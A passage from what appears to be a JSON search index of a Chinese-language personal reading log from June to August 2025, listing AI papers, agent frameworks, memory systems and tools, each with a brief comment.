<li>\u9488\u5bf9\u8868\u683c\u6570\u636e\u7684\u5b66\u4e60\u63a8\u7406\uff0c\u505a\u4e86\u4e00\u4e2aAgent\u4e13\u95e8\u7528\u6765\u5b66\u4e60\u8868\u683c\u6570\u636e</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-6/#623","title":"6.23","text":"<ul> <li>https://www.moonbitlang.cn/<ul> <li>AI\u539f\u751f\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u5185\u90e8\u6709\u5f88\u591a\u7684features\u6765\u652f\u6301\u9ad8\u6548\u5730AI coding\uff0c\u5305\u62ec\u4ee3\u7801\u5c40\u90e8\u6027\u5730\u4fdd\u8bc1\uff0c\u66f4\u6709\u6548\u5730\u6587\u6863</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-6/#625","title":"6.25","text":"<ul> <li>https://github.com/embabel<ul> <li>\u57fa\u4e8eSpring\u7684Agent\u6846\u67b6\uff0c\u7531Spring\u7684\u4f5c\u8005\u521b\u5efa\uff0c\u5176\u4e2d\u4e00\u4e2a\u5f88\u795e\u5947\u7684\u7279\u70b9\u5728\u4e8e\u5176\u5728\u4efb\u52a1\u89c4\u5212\u4e0a\u91c7\u7528\u4e86\u4f20\u7edf\u7b97\u6cd5\uff0c\u800c\u4e0d\u662fLLM\u6765\u505a\u89c4\u5212\uff0cLLM\u53ea\u4f7f\u7528\u5728\u5177\u4f53\u7684\u4efb\u52a1\u6267\u884c\u4e0a\uff0c\u5176\u8ba4\u4e3a\u8fd9\u79cd\u65b9\u6848\u53ef\u4ee5\u6709\u6548\u907f\u514dLLM\u89c4\u5212\u603b\u4f1a\u6709\u6982\u7387\u51fa\u9519\u7684\u95ee\u9898</li> </ul> </li> <li>https://deckspeed.com/zh-Hans<ul> <li>Product Hunt \u699c\u9996\u7684PPT\u751f\u6210\u5de5\u5177</li> </ul> </li> <li>https://phoenix.new/<ul> <li>\u4e00\u4e2a\u5bb9\u5668\u5316\u7684Agent\u7f16\u7a0b\u6846\u67b6\uff0c\u9488\u5bf9Phoenix\u8fd9\u4e2aweb\u6846\u67b6\u4f18\u5316\uff0c\u5339\u914d\u4e0afly.io\u548cGithub\uff0c\u53ef\u4ee5\u505a\u5230\u7f16\u7a0b\u7684\u7ed3\u679c\u4e00\u952e\u90e8\u7f72</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/","title":"2025.7","text":""},{"location":"reading/dailyreading/2025-7/#71","title":"7.1","text":"<ul> <li>https://arxiv.org/abs/2506.21545<ul> <li>\u5fae\u8f6f\u7684\u6570\u636e\u5904\u7406\u7684paper\uff0c\u7cfb\u7edf\u8bba\u8ff0\u4e86\u5982\u4f55\u4f18\u5316\u6570\u636e\u7684\u7ec4\u7ec7\u7684\u65b9\u5f0f\u6765\u63d0\u9ad8\u8bed\u8a00\u6a21\u578b\u7684\u6027\u80fd\uff0c\u5728\u6570\u636e\u5185\u5bb9\u548c\u6a21\u578b\u67b6\u6784\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\u5982\u4f55\u63d0\u9ad8\u6a21\u578b\u6027\u80fd</li> <li>\u4e0e\u4f20\u7edf\u7684\u6570\u636e\u6253\u4e71\u548c\u6df7\u5408\u65b9\u5f0f\u4e0d\u540c\uff0c\u8be5\u5de5\u4f5c\u5bf9data\u8fdb\u884c\u4e86\u8bc4\u5206\uff0c\u6309\u7167\u8fd9\u4e2a\u8bc4\u5206\u8fdb\u884c\u7b5b\u9009\u548c\u6392\u5e8f\u518d\u8fdb\u884c\u8bad\u7ec3</li> <li>\u5e76\u4e14\u5728\u8bad\u7ec3\u7684\u8fc7\u7a0b\u4e2d\uff0c\u8fd8\u4f1a\u8fdb\u884c\u6709\u9009\u62e9\u5730\u91cd\u590d\u6570\u636e\u7684\u8bad\u7ec3Folding Order\u6765\u907f\u514d\u6a21\u578b\u9057\u5fd8\u7b49\u95ee\u9898</li> </ul> </li> <li>https://arxiv.org/abs/2506.22419<ul> <li>Meta\u63d0\u51fa\u7684Agent benchmark\uff0c\u5176\u4e2d\u7684task\u662f\u8bba\u6587\u590d\u73b0\uff0c\u590d\u73b0GPT2\u7684\u8bad\u7ec3\u52a0\u901f\u5de5\u4f5c\uff0c\u8fd9\u4e2a\u52a0\u901f\u5de5\u4f5c\u6765\u81ea\u4e8e\u4e00\u4e2a\u7ade\u8d5b\uff0c\u7ade\u8d5b\u7684\u6bcf\u4e2a\u63d0\u4ea4\u90fd\u6709\u5bf9\u5e94\u7684\u8bad\u7ec3\u811a\u672c\u548c\u8bf4\u660e\uff0c\u6d4b\u8bd5Agent\u80fd\u5426\u57fa\u4e8e\u4e0a\u8ff0\u4fe1\u606f\u505a\u51fa\u6709\u6548\u7684\u590d\u73b0\uff0c\u5bf9\u4e8e\u76f8\u5173\u7ade\u8d5b\u5730\u8bc4\u5ba1\u5de5\u4f5c\u4e5f\u6bd4\u8f83\u6709\u5b9e\u9645\u610f\u4e49</li> <li>\u6d4b\u8bd5\u4f7f\u7528\u7684Agent\u6846\u67b6\u662fScaffolds extends AIDE \uff0cAIDE\u662f\u4e00\u4e2aexploration agent\u7684\u6846\u67b6</li> </ul> </li> </ul> <p>Workflow Agent\u548cExploration Agent\u7684\u533a\u522b\uff0c\u5728\u770b\u8bba\u6587\u7684\u9636\u6bb5\u6ce8\u610f\u5230\u73b0\u5728Agent\u7684\u65b9\u5411\u9010\u6e10\u5206\u5316\u51fa\u4e24\u4e2a\u76ee\u6807 - Workflow Agent\uff0c\u662f\u4eba\u7c7b\u77e5\u9053\u8be5\u600e\u4e48\u505a\uff0c\u4f46\u662f\u5e0c\u671b\u501f\u52a9Agent\u7684\u80fd\u529b\u5c06\u7c7b\u4f3c\u7684\u5de5\u4f5c\u81ea\u52a8\u5316\uff08Manus\uff0c\u5404\u79cdMultiAgent\uff09 - Exploration Agent\uff0c\u662f\u4eba\u7c7b\u4e0d\u77e5\u9053\u600e\u4e48\u505a\uff0c\u4f8b\u5982\u89e3\u51b3\u4e00\u4e9b\u79d1\u7814\u5b66\u672f\u96be\u9898\uff0c\u501f\u52a9Agent\u7684\u80fd\u529b\u8fdb\u884c\u63a2\u7d22\uff08AIDE\uff0cML-Master\uff09\uff0c\u5f80\u5f80\u4f1a\u91c7\u7528Tree or Greedy\u7684\u65b9\u6848\u8fdb\u884c\u63a2\u7d22 </p> <ul> <li>https://arxiv.org/abs/2506.16499<ul> <li>\u4e0a\u4ea4\u63d0\u51fa\u7684Agent\uff0c\u5728MLE-Bench\u4e0a\u5237\u5230\u4e86SOTA\uff0cMLE-Bench\u4e2d\u670975\u4e2aKaggle\u4e0a\u7684\u771f\u5b9e\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u7ec4\u6210</li> <li>\u76ee\u6807\u662f\u8fbe\u5230\u63a8\u7406\u548c\u641c\u7d22\u7684\u5e73\u8861\u7edf\u4e00\uff0c\u672a\u8fdb\u884c\u8bad\u7ec3\uff0c\u4ee3\u7801\u5373\u5c06\u5f00\u6e90</li> <li>\u641c\u7d22\u6811\u7684\u8282\u70b9\u662f\u4e00\u4e2a\u65b9\u6848\u7684\u67d0\u4e2a\u72b6\u6001\uff0c\u6811\u7684\u8fb9\u662f\u6307\u884c\u52a8\uff0c\u4f8b\u5982Draft\uff0cDebug or Improve</li> <li>\u6838\u5fc3\u662f\u5e94\u7528\u4e86\u4e00\u79cd\u81ea\u9002\u5e94\u7684memory\u673a\u5236</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#72","title":"7.2","text":"<ul> <li>https://fmhy.net/ai<ul> <li>\u5168\u7403\u5404\u79cd\u514d\u8d39\u8d44\u6e90\u6c47\u603b\u94fe\u63a5\uff0c\u5305\u62ec\u5a31\u4e50\u8d44\u6e90\u548c\u5f00\u53d1\u8d44\u6e90</li> </ul> </li> <li>https://sierra.ai/<ul> <li>\u5f00\u53d1\u5ba2\u670dAgent\u670d\u52a1\uff0c\u76f8\u6bd4\u4e8e\u4e4b\u524d\u7684pine.ai\u662f\u5e2e\u7528\u6237\u53bb\u5411\u5ba2\u670d\u6253\u7535\u8bdd\uff0c\u4ece\u800c\u5e2e\u52a9\u7528\u6237\u907f\u514d\u53cd\u590d\u7684\u6253\u5404\u79cd\u7535\u8bdd\u6d88\u8017\u7684\u7cbe\u529b\uff0cSierra.ai\u7684\u670d\u52a1\u5c31\u6070\u597d\u76f8\u53cd\uff0c\u662f\u53bb\u81ea\u5df1\u4f5c\u4e3a\u5ba2\u670d\u53bb\u63a5\u7528\u6237\u7684\u7535\u8bdd</li> <li>\u5728Agent\u6c9f\u901a\u8fd9\u4e2a\u9886\u57df\u548cpine.ai\u6709\u76f8\u540c\u7684\u8003\u91cf\uff0c\u6bd4\u5982\u5982\u4f55\u4fdd\u8bc1\u5b9e\u65f6\u6027\u548c\u5145\u5206\u7684\u601d\u8003\uff0c\u540c\u65f6\u4e5f\u6709\u4e00\u4e9b\u5dee\u5f02\u5316\u7684\u601d\u8003\uff0c\u6bd4\u5982\u7528\u6237\u7684\u7535\u8bdd\u8bed\u97f3\u5f80\u5f80\u4f1a\u5e26\u6709\u80cc\u666f\u6742\u97f3\uff0c\u56e0\u6b64\u5176\u5728\u80cc\u666f\u97f3\u8fc7\u6ee4\u548c\u5224\u65ad\u4e0a\u505a\u4e86\u6bd4\u8f83\u591a\u7684\u52aa\u529b</li> <li>\u9700\u8981\u96c6\u6210\u4e3b\u6d41CRM\uff0cCDP\uff0cERP\u7cfb\u7edf</li> <li>\u5176\u6784\u5efa\u4e86\u4e00\u4e2aAgent OS\u6765\u5e2e\u52a9\u5feb\u901f\u642d\u5efa\u9700\u8981\u7684Agent system</li> </ul> </li> <li>\u2023<ul> <li>LangSmith\u662fLangChain\u5f00\u53d1\u7684\u4e00\u4e2a\u7ec4\u4ef6\uff0c\u7528\u4e8e\u68c0\u6d4bAgent\u884c\u52a8\u7684\u6bcf\u4e00\u6b65\u7684Context\uff0c\u7528\u6765\u5206\u6790\u6bcf\u4e00\u6b21LLM call\u662f\u5426\u90fd\u7ed9\u51fa\u4e86\u51c6\u786e\u7684\u4e0a\u4e0b\u6587</li> <li>\u4e0d\u4ec5\u9650\u4e8e\u57fa\u4e8eLangGraph\u5f00\u53d1\u7684Agent\uff0c\u662f\u5426\u9700\u8981\u4ed8\u8d39\uff1f</li> </ul> </li> <li>https://arxiv.org/abs/2506.24119<ul> <li>\u4e00\u4e2a\u7528\u81ea\u6211\u535a\u5f08\u6765\u4ee3\u66ff\u5956\u52b1\u51fd\u6570\u8fdb\u884c\u8fed\u4ee3\u7684RL\u65b9\u6848</li> </ul> </li> <li>https://arxiv.org/abs/2506.23235<ul> <li>\u7528\u9006\u5f3a\u5316\u5b66\u4e60\uff0c\u5c06\u901a\u7528\u5927\u6a21\u578b\u8f6c\u6362\u6210\u901a\u7528\u7684Reward Model\uff0c\u4e5f\u5373\u6bcf\u4e2a\u6a21\u578b\u53ef\u4ee5\u81ea\u5df1\u4ece\u81ea\u5df1\u7684rollout\u4e2d\u8ba1\u7b97\u5956\u52b1</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#73","title":"7.3","text":"<ul> <li>\u200d\u202c\u2060\ufeff\u2060\u200c\u200d\u2060\u2060\u2060\ufeff\u202c\u200d\u202c\ufeff\u200d\u200c\ufeff\u2060\u202c\ufeff\u200d\u202c\u200c\ufeff\u2060\u202c\u2060Gemini CLI Prompts - \u98de\u4e66\u4e91\u6587\u6863<ul> <li>Gemini CLI \u7684Prompt\u8bbe\u8ba1\uff0c\u5982\u4f55\u7ed9case\u5982\u4f55\u505a\u5f3a\u8c03</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#74","title":"7.4","text":"<ul> <li>https://github.com/anthropics/dxt<ul> <li>Anthropics\u5b98\u65b9\u63a8\u51fa\u7684\u670d\u52a1\uff0c\u7528\u4e8e\u89e3\u51b3MCP\u7684\u73af\u5883\u51b2\u7a81\u95ee\u9898\uff0c\u53ef\u4ee5\u505a\u5230\u4e00\u952e\u5b89\u88c5MCP extension\u800c\u4e0d\u9700\u8981\u5b89\u88c5Node\uff0cPython\u7b49\u73af\u5883</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#77","title":"7.7","text":"<ul> <li>https://github.com/MemTensor/MemOS<ul> <li>\u4e00\u4e2a\u8f83\u4e3a\u5b8c\u5907\u7684Memory\u7cfb\u7edf\uff0c\u4eca\u5929\u521a\u521a\u5f00\u6e90\uff0c\u5e94\u8be5\u662fsota\u7684\uff0c\u751a\u81f3\u5728\u90e8\u5206\u573a\u666f\u8d85\u8d8a\u4e86Full-context\u7684\u8868\u73b0\uff0c\u53ef\u4ee5\u501f\u6b64\u9879\u76ee\u5bf9\u4e8eMemory\uff0cRag\uff0cGraph DB\u7b49\u7cfb\u7edf\u6709\u4e00\u4e2a\u5b8c\u6574\u7684\u4e86\u89e3</li> </ul> </li> <li>https://arxiv.org/abs/2507.02592<ul> <li>\u963f\u91cc\u5728WebDancer\u4e0a\u7ee7\u7eed\u505a\u7684Agent\u5de5\u4f5c\uff0c\u662fDeep research agent RL\u7684\u5de5\u4f5c</li> </ul> </li> <li>https://arxiv.org/abs/2507.02259<ul> <li>\u5b57\u8282\u7684Memory Agent\uff0c\u8bbe\u8ba1\u4e86\u4e00\u79cdMemory\u673a\u5236\u53ef\u4ee5\u8ba9Agent\u81ea\u4e3b\u5730\u4fee\u6539\uff0c\u5c06Memory\u673a\u5236\u4f5c\u4e3a\u5de5\u5177\uff0c\u7528RL\u8fdb\u884c\u8bad\u7ec3\uff0c\u53ef\u4ee5\u5728\u957f\u4efb\u52a1\u4e2d\u8fbe\u5230\u5f88\u597d\u5730\u6548\u679c</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#78","title":"7.8","text":"<ul> <li>GEO\uff0c\u4e0eSEO\u76f8\u5bf9\u7684\u6982\u5ff5\uff0c\u8bbe\u8ba1\u81ea\u5df1\u7684\u7f51\u7ad9\uff0c\u4f7f\u5176\u5185\u5bb9\u5e03\u5c40\u66f4\u5bb9\u6613\u51fa\u73b0\u5728Gemini\u7684\u6355\u83b7\u8def\u5f84\u4e0a</li> <li>https://github.com/zaidmukaddam/scira<ul> <li>\u5f00\u6e90\u7248\u7684perplexity\uff0c\u7ed3\u5408\u4e86\u5f88\u591a\u7684\u641c\u7d22\u6e90</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#79","title":"7.9","text":"<ul> <li>[2507.05169] Critiques of World Models<ul> <li>\u5bf9\u4e8e\u5f53\u524dWorld Model\u7684\u6279\u5224\uff0c\u8ba4\u4e3aWorld Model\u4e0d\u5e94\u8be5\u5c40\u9650\u4e8e\u957f\u89c6\u9891\u751f\u6210\u9886\u57df\uff0c\u5e94\u8be5\u5f15\u5165\u66f4\u52a0\u4e30\u5bcc\u7684\u6a21\u6001\uff0c\u5e76\u4e14\u63d0\u51faWorld Model\u5e94\u8be5\u662fAgent\u672a\u6765\u7684\u6a21\u62df\u6c99\u76d2</li> </ul> </li> <li>https://pokee.ai/<ul> <li>\u73b0\u9636\u6bb5\u5f00\u653e\u4e86\u4e00\u4e2aworkflow agent\u7ed9\u6211\u4eec\uff0c\u6839\u636e\u7528\u6237\u7684\u9700\u6c42\u6784\u5efaWorkflow\uff0c\u968f\u540e\u6267\u884c</li> <li>\u76ee\u524d\u770b\u4e86\u4e00\u4e0b\u5b83\u7684\u5de5\u4f5c\u6d41\u8fd8\u662f\uff0c\u62df\u5b9a\u8ba1\u5212+\u6536\u96c6\u4fe1\u606f+\u6267\u884c\u4e09\u6b65\u8d70\uff0c\u6bd4\u8f83\u901a\u7528\u7684\u5de5\u4f5c\u6d41\uff0c\u4f46\u662f\u5176\u4f3c\u4e4e\u5bf9\u63d0\u793a\u8bcd\u6bd4\u8f83\u654f\u611f\uff0c\u540c\u65f6\u4e5f\u7ecf\u5e38\u51fa\u73b0\u641c\u7d22\u51fa\u9519\u5361\u4f4f\u7684\u60c5\u51b5</li> <li>\u6ca1\u6709\u53d1\u73b0\u56de\u9000\u548c\u5faa\u73af\u7684\u8bbe\u8ba1\uff0c\u4f46\u662f\u5176\u641c\u7d22\u663e\u793a\u4e86\u5176\u662f\u5e76\u53d1\u641c\u7d22</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#711","title":"7.11","text":"<ul> <li>https://arxiv.org/abs/2507.07017<ul> <li>\u5b57\u8282\u53d1\u5e03\u7684\u5bf9\u4e8eRL\u7406\u8bba\u7684\u4e00\u4e9b\u63a2\u7d22\uff0c\u5bf9\u4e8e\u73b0\u9636\u6bb5RL\u5728\u63a2\u7d22\u9636\u6bb5\u4e0d\u7a33\u5b9a\u7684\u5206\u6790\uff0c\u5bf9\u4e8eRL\u7684\u7406\u8bba\u53ef\u4ee5\u7528\u6765\u52a0\u6df1</li> </ul> </li> <li>[2507.06229] Agent KB: Leveraging Cross-Domain Experience for Agentic Problem Solving<ul> <li>\u4e00\u7bc7\u5173\u4e8eAgent\u7ecf\u9a8c\u603b\u7ed3\u7684\u8bba\u6587\uff0c\u5982\u4f55\u5728\u4e0d\u540c\u7684Agent\u4e2d\u590d\u7528\u4e4b\u524d\u7684\u7ecf\u9a8c\uff0c\u5176\u63d0\u4f9b\u4e86\u6559\u5e08-\u5b66\u751f\u4ee3\u7406\uff0c\u8ba9\u5b66\u751f\u4ee3\u7406\u53bb\u5b66\u4e60\u6559\u5e08\u4ee3\u7406\u4e4b\u524d\u7684\u7ecf\u9a8c</li> <li>\u5176\u7528smolagent\u4f5c\u4e3a\u6559\u5e08\u6a21\u578b\u8fdb\u884cGAIA\u4e0a\u7684\u6d4b\u8bc4\uff08\u4e0d\u8fc7\u8fd9\u4e2a\u5728\u540c\u4e00\u4e2abenchmark\u4e0a\u79ef\u7d2f\u7ecf\u9a8c\u771f\u7684\u4e0d\u662f\u5e7d\u9ed8\u5417</li> </ul> </li> <li>[2507.05791] GTA1: GUI Test-time Scaling Agent<ul> <li>\u5bf9\u4e8eGUI agent\u7684RL</li> </ul> </li> <li>[2507.05257] Evaluating Memory in LLM Agents via Incremental Multi-Turn Interactions<ul> <li>\u5bf9\u4e8eAgent Memory\u7684benchmark</li> </ul> </li> <li>[2507.05578] The Landscape of Memorization in LLMs: Mechanisms, Measurement, and Mitigation<ul> <li>\u5173\u4e8e\u6a21\u578bMemory\u673a\u5236\u7684\u4e00\u4e2a\u7efc\u8ff0</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#714","title":"7.14","text":"<ul> <li>https://mirix.io/<ul> <li>\u8fd9\u4e2amemory\u7cfb\u7edf\u672c\u8eab\u5c31\u662f\u4e00\u4e2amultiagent\u7cfb\u7edf\uff0c\u4f18\u52bf\u5728\u4e8e\u5bf9\u4e8e\u591a\u6a21\u6001\u4fe1\u606f\u7684\u5904\u7406\u80fd\u529b\u5f88\u5f3a\uff0c\u9644\u5e26\u6709\u81ea\u52a8\u622a\u56fe\u7684\u529f\u80fd\uff0c\u63a8\u6d4b\u548cComputerUse\u7684\u76f8\u6027\u4f1a\u6bd4\u8f83\u597d</li> </ul> </li> <li>https://www.arxiv.org/abs/2507.07969<ul> <li>\u57fa\u4e8eRL\u7684\u6a21\u4eff\u5b66\u4e60\uff1f</li> </ul> </li> <li>https://www.arxiv.org/abs/2507.07955<ul> <li>LLM\u7684No-tokenizer\u65b9\u6848\uff0cH-net</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#715","title":"7.15","text":"<ul> <li>Goodie AI: Answer Engine Optimization &amp; AI Search Visibility Platform<ul> <li>GEO\u7684\u4ea7\u54c1\u4e4b\u4e00\uff0c\u8ba9\u4f60\u7684\u4ea7\u54c1\u80fd\u591f\u5feb\u901f\u51fa\u73b0\u4e86Claude\uff0cDeepseek\u548cGemini\u7b49\u7684\u641c\u7d22\u8def\u5f84\u4e2d\uff0c\u548cSEO\u5bf9\u79f0\uff0c\u53d8\u6210\u4e86\u4e00\u79cd\u6295\u653e\u5e7f\u544a\u7684\u65b9\u6848</li> </ul> </li> <li>Overview<ul> <li>MCP auth\uff0c\u662f\u7528\u4e8e\u7ed9MCP server\u63d0\u4f9bOauth\u6258\u7ba1\u7684\u670d\u52a1\uff0c\u5f00\u6e90</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#716","title":"7.16","text":"<ul> <li>[2507.00432] Does Math Reasoning Improve General LLM Capabilities? Understanding Transferability of LLM Reasoning<ul> <li>\u8bba\u8bc1RL\u5bf9\u4e8e\u63a8\u7406\u80fd\u529b\u7684\u6cdb\u5316\u6027</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#717","title":"7.17","text":"<ul> <li>Towards Agentic RAG with Deep Reasoning: A Survey of RAG-Reasoning Systems in LLMs<ul> <li>Rag + Reasoning\u7684\u7efc\u8ff0</li> </ul> </li> <li>[2507.10524] Mixture-of-Recursions: Learning Dynamic Recursive Depths for Adaptive Token-Level Computation<ul> <li>\u4e00\u7bc7\u5173\u4e8e\u63a8\u7406\u52a0\u901f\u7684\u8bba\u6587 \u540c\u65f6\u4f7f\u7528\u4e86\u53c2\u6570\u5171\u4eab+\u81ea\u9002\u5e94\u8ba1\u7b97+KV cache</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#718","title":"7.18","text":"<ul> <li>[2507.11988] Aime: Towards Fully-Autonomous Multi-Agent Framework<ul> <li>\u5b57\u8282\u7684Multi-Agent\u7cfb\u7edf\uff0c\u4ee5\u7075\u6d3b\u6027\u4e3a\u4e3b\u52a8\uff0c\u53ef\u4ee5\u901a\u8fc7Agent\u5de5\u5382\u6784\u5efa\u4e0d\u540c\u7c7b\u578b\u7684Agent\uff0c\u52a8\u6001\u5730\u8c03\u6574\u4efb\u52a1\u548c\u76d1\u63a7\u4efb\u52a1\u60c5\u51b5\uff0c\u5bf9\u6297Multi-Agent\u7cfb\u7edf\u7684\u4e0d\u7075\u6d3b\u6027</li> <li>\u5728\u5404\u4e2abenchmark\u4e0a\u90fd\u80fd\u6bd4\u80a9\u4e13\u7528Agent</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#725","title":"7.25","text":"<ul> <li>[2506.01939] Beyond the 80/20 Rule: High-Entropy Minority Tokens Drive Effective Reinforcement Learning for LLM Reasoning<ul> <li>\u963f\u91cc\u7684\u4e00\u7bc7\u6587\u7ae0\uff0c\u8bb2\u8ff0\u4e86\u5728\u5f3a\u5316\u5b66\u4e60\u4e2d\uff0c\u4e0d\u662f\u6bcf\u4e00\u4e2atoken\u90fd\u662f\u540c\u7b49\u4ef7\u503c\u7684\uff0c\u6bd4\u5982\u6709\u4e00\u4e9b\u6b65\u9aa4\u5728\u9884\u6d4b\u7684\u65f6\u5019\uff0c\u6709\u597d\u51e0\u4e2atoken\u662f\u76f8\u540c\u7684\u6982\u7387\uff0c\u8fd9\u7c7btoken\u88ab\u6210\u4e3aHigh-Entropy\u7684tokens\uff0c\u5982\u679c\u53ea\u4f18\u5316\uff08\u53cd\u5411\u4f20\u64ad\uff0920%\u7684High-Entropy tokens\uff0c\u6709\u6982\u7387\u53ef\u4ee5\u4f7f\u5f97\u5168\u91cf\u4f18\u5316\u66f4\u597d\u7684\u7ed3\u679c</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#728","title":"7.28","text":"<ul> <li>[2507.18074] AlphaGo Moment for Model Architecture Discovery<ul> <li>\u4e0a\u4ea4\u5f00\u53d1\u7684Multi-agent\u7cfb\u7edf\u6765\u505a\u6a21\u578b\u67b6\u6784\u7684\u63d0\u5347\uff0c\u81ea\u4e3b\u63a2\u7d22\u65b0\u7684\u6a21\u578b\u67b6\u6784\u6765\u63d0\u5347\u6a21\u578b\u80fd\u529b</li> </ul> </li> <li>[2507.18634] Captain Cinema: Towards Short Movie Generation<ul> <li>\u5b57\u8282\u7684\u4e00\u7bc7\u5173\u4e8e\u957f\u89c6\u9891\u751f\u6210\u7684\u5185\u5bb9\uff0c\u901a\u8fc7\u5173\u952e\u5e27\u751f\u6210\u6a21\u5757+\u89c6\u9891\u751f\u6210\u6a21\u5757+Memory\u6a21\u5757\uff0c\u6765\u5b9e\u73b0\u4e86\u77ed\u7535\u5f71\u7684\u751f\u6210\u80fd\u529b</li> <li>\u5b9e\u9645\u770b\u8d77\u6765\u6548\u679c\u4e00\u822c\uff0c\u50cf\u662f\u4e00\u6bb5\u4e00\u6bb5\u5173\u952e\u5e27\u751f\u6210\u7684GIF\u62fc\u63a5\u8d77\u6765\uff0c\u4eba\u7269\u7684\u52a8\u4f5c\u548c\u5206\u955c\u90fd\u4e0d\u591f\u6d41\u7545</li> </ul> </li> <li>[2507.18624] Checklists Are Better Than Reward Models For Aligning Language Models<ul> <li>CMU\u7684\u4e00\u7bc7\u6587\u7ae0\uff0c\u8bb2\u8ff0\u4e00\u79cd\u589e\u5f3a\u6a21\u578b\u6307\u4ee4\u9075\u5faa\u6027\u7684\u65b9\u6848\uff0c\u6807\u8bb0\u6570\u636e\u662f\u4eba\u7c7b\u7684\u6307\u4ee4+\u4e00\u8fde\u4e32\u5173\u4e8e\u8fd9\u4e2a\u6307\u4ee4yes or no\u7684\u7ed3\u679c\uff0c\u57fa\u4e8e\u8fd9\u4e2a\u65b9\u6848\u505aRL</li> <li>\u4e2a\u4eba\u8ba4\u4e3a\u5728\u89c4\u5212\u65b9\u6848\u4e2d\uff0c\u8fd9\u4e2a\u8303\u5f0f\u6ca1\u51c6\u4e5fmake sense\uff0c\u53ef\u4ee5\u7528\u6765\u7ed9\u7528\u6237\u63d0\u4f9b\u4e00\u4e9b\u9ed8\u8ba4\u56de\u7b54</li> </ul> </li> <li>[2507.17746] Rubrics as Rewards: Reinforcement Learning Beyond Verifiable Domains<ul> <li>\u6269\u5c55reward function\u5730\u80fd\u529b\uff0c\u5728\u533b\u5b66\uff0c\u6cd5\u5f8b\u7b49\u65b9\u9762\u83b7\u53d6\u4e86\u6709\u6548\u5730\u8fdb\u5c55\uff0c\u65b9\u6848\u662f\u8bbe\u8ba1\u4e00\u7cfb\u5217\u5730\u6253\u5206\u6807\u51c6\uff0c\u5c31\u548c\u9ad8\u8003\u5224\u8bed\u6587\u9898\u76ee\u4e00\u6837\uff0c\u4f5c\u4e3averification\uff0c\u8fdb\u884cRL</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-7/#729","title":"7.29","text":"<ul> <li>[2507.19427] Step-3 is Large yet Affordable: Model-system Co-design for Cost-effective Decoding<ul> <li>\u9636\u8dc3\u661f\u8fb0\u8fd1\u671f\u53d1\u5e03\u7684\u65b0\u7248\u5927\u6a21\u578b</li> </ul> </li> <li>Chat with Z.ai - Free AI for Presentations, Writing &amp; Coding<ul> <li>\u667a\u8c31\u8fd1\u671f\u53d1\u5e03\u7684\u65b0\u7248\u5927\u6a21\u578b</li> </ul> </li> <li>[2507.19457] GEPA: Reflective Prompt Evolution Can Outperform Reinforcement Learning<ul> <li>\u5173\u4e8e\u63d0\u793a\u8bcd\u4f18\u5316\u7684\u5de5\u4f5c\uff0c\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u5de5\u4f5c\u5b66\u4e60\u4e00\u4e0b\u5982\u4f55\u4f18\u5316\u7cfb\u7edf\u63d0\u793a\u8bcd</li> <li>\u6838\u5fc3\u5728\u4e8e\u591a\u76ee\u6807\u4f18\u5316\uff0cPareto\u7684\u6982\u5ff5\uff1a\u201c\u5728\u591a\u4e2a\u4e92\u76f8\u51b2\u7a81\u7684\u76ee\u6807\u4e0a\uff0c\u518d\u4e5f\u627e\u4e0d\u5230\u4efb\u4f55\u201c\u4e00\u4e2a\u76ee\u6807\u53d8\u597d\u800c\u53e6\u4e00\u4e2a\u4e0d\u53d8\u5dee\u201d\u7684\u5019\u9009\u65b9\u6848\u7684\u96c6\u5408\u3002\u201d \u4f7f\u5f97Prompt\u4e0d\u81f3\u4e8e\u53d8\u4e3a\u5c40\u90e8\u6700\u4f18</li> </ul> </li> <li>https://github.com/jd-opensource/joyagent-jdgenie<ul> <li>\u4eac\u4e1c\u5f00\u6e90\u7684agent\uff0c\u4e00\u4e2a\u8f83\u4e3a\u901a\u7528\u7684multi-agent\u7cfb\u7edf</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-8/","title":"2025 8","text":""},{"location":"reading/dailyreading/2025-8/#81","title":"8.1","text":"<ul> <li>[2507.21892] Graph-R1: Towards Agentic GraphRAG Framework via End-to-end Reinforcement Learning<ul> <li>\u4e00\u7bc7\u57fa\u4e8e\u5728Graph Rag\u4e0a\u505a\u5f3a\u5316\u5b66\u4e60\uff0c\u63d0\u9ad8\u95ee\u7b54\u8d28\u91cf\u7684\u5de5\u4f5c</li> <li>\u4f46\u662f\u4e2a\u4eba\u89c9\u5f97\u6ca1\u6709\u89e3\u51b3\u9700\u8981\u9ad8\u8d28\u91cf\u7684Rag\u56fe\u7684\u95ee\u9898\uff0c\u53ea\u662f\u589e\u5f3a\u6a21\u578b\u5728Graph rag\u4e0a\u63a2\u7d22\u7684\u80fd\u529b</li> </ul> </li> <li>TestSprite - Homepage<ul> <li>AI for software testing</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-8/#85","title":"8.5","text":"<ul> <li>[2507.21509] Persona Vectors: Monitoring and Controlling Character Traits in Language Models<ul> <li>\u4eba\u683c\u5411\u91cf\u6765\u63a7\u5236LLM\u7684\u60c5\u7eea\uff0c\u5bf9\u4e8e\u4eba\u683cor\u60c5\u7eea\u6a21\u62df\u6280\u672f\u6709\u4ef7\u503c</li> </ul> </li> <li>[2508.00819] Beyond Fixed: Variable-Length Denoising for 